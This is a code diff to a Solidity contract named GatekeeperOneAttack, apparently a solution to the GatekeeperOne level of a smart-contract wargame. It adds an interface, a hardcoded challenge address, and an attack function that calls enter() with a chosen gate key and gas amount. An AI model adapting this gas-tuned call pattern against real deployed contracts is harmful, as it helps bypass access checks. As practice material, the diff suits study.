@@ -2,9 +2,14 @@
 
 pragma solidity ^0.6.0;
 
+interface GatekeeperOne {
+    function enter(bytes8 _gateKey) external returns (bool);
+}
+
 contract GatekeeperOneAttack {
 
     event AttackAttemptEvent(uint256 index, uint256 gas, bool result);
+    GatekeeperOne challenge = GatekeeperOne(0xF1eD752dF2889567cc75E49155E1347249A5F0e1);
 
     function show() public view returns (
         uint32, uint16, uint64, uint64
@@ -42,5 +47,9 @@ contract GatekeeperOneAttack {
             }
         }
         return false;
+    }
+
+    function attack(bytes8 gateKey, uint256 gasToUse) external payable {
+        challenge.enter{gas: gasToUse}(gateKey);
     }
 }
